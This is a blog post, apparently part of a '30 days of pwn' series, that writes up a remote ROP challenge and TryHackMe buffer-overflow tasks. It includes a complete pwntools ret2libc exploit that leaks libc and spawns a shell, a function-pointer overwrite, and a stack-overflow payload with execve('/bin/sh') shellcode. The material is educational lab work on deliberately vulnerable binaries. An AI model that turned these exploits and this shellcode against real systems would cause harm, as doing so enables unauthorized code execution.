---
layout: post
title:  "Tryhackme Day Six"
date:   2020-07-06 20:05:48 +0100
categories: pwn
---

Here is day six of the 30 days of pwn challenge. Today we will be looking through a remote 'rop' challenge which will involve leaking a libc version to get "/bin/sh" and other offsets to get a shell on a machine.

After this I will look at some of the basic challenges on TryHackMe.

## Remote ROP

This challenge was heavily aided by the content found [here](https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address) as it helped show how to leak a libc version on a remote file.


Leaking libc address:
```
[*] Leaked libc address,  puts: 0x7f6db1a9b690
```
Finding libc version using [libc-database](https://github.com/niklasb/libc-database)
```
./find puts 0x7f6db1a9b690

ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Now we can download the libc version and use it in our script with:
```
libc = ELF("/opt/libc-database/libs/libc6_2.23-0ubuntu10_amd64/libc.so.6")
```
Now we have the libc version, we can use pwntools to find the rest of the addresses we need:
```
BINSH = next(libc.search("/bin/sh")) - 64 #Use -64 if you get the "%s%s%s%s%s not found" error
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]
PUT = libc.sym["puts"]

log.info("/bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Now we have everything we need and can get a shell on the machine.

### Exploit Code
```
from pwn import *

r = process('rop_challenge')

p = remote("127.0.0.1", 1337)
OFFSET =  'A' * 72

elf = ELF('rop_challenge')
rop = ROP('rop_challenge')
libc = ELF("/opt/libc-database/libs/libc6_2.23-0ubuntu10_amd64/libc.so.6")

PUTS_PLT = elf.plt['puts'] 
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] 
RET = (rop.find_gadget(['ret']))[0]

def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    #Send our rop-chain payload
    p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
    print(p.clean()) # clean socket buffer (read all and print)
    p.sendline(rop1)

    #Parse leaked address
    recieved = p.recvline().strip()
    leak = u64(recieved.ljust(8, "\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    #If not libc yet, stop here
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base

BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]
PUT = libc.sym["puts"]

rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
p.clean()
p.sendline(rop2)

p.interactive()
```

## TryHackMe

Now we can go onto what was intended for today (I was happy to have learned to do the challenge I did yesterday so I had to throw it in!), Tryhackme has a few buffer overflow challenges that we will go through. 

To start off we will do the challenge found [here](https://tryhackme.com/room/bof1)

### Task6
**Question 1** 	
What is the minimum number of characters needed to overwrite the variable?
```
The offset is 15
```
### Task7
**Question 1**
Invoke the special function()

**Func-pointer.c**
```
void special()
{
    printf("this is the special function\n");
    printf("you did this, friend!\n");
}

void normal()
{
    printf("this is the normal function\n");
}

void other()
{
    printf("why is this here?");
}

int main(int argc, char **argv)
{
    volatile int (*new_ptr) () = normal;
    char buffer[14];
    gets(buffer);
    new_ptr();
}
```

### Exploit Code
```
import struct
special = struct.pack("<Q",0x0000000000400567)

print 'A' * 14 + special
```
```
python exploit.py | ./func-pointer 

this is the special function
you did this, friend!
```

### Task8
**Buffer-overflow.c**
```
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}
```

This challenge is using a basic stack buffer overflow. I initially tried to do a ret2libc attack on this binary, but I think there was a null-byte issue (I think I heard somewhere that strcpy stops on null byte.)


### Exploit Code
```
import struct

shellcode = "\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05"
shellcode_len = len(shellcode)
stack_addr = struct.pack("<Q",0x7fffffffe24a+60)
offset = 152
junk = 12

payload = '\x90' * (offset - shellcode_len - junk) + shellcode + 'A' * junk + stack_addr

print payload
```

**Use the above method to open a shell and read the contents of the secret.txt file.**
```
omgyoudidthissocool!!
```

A short day again?! Blasphemy. Well, tomorrow I will be heading to the windows buffer-overflow machines and as this might take some time, I will save it for a fresh post tomorrow. The 2 machines are the OSCP-like "Brainstorm" and "Brainpan".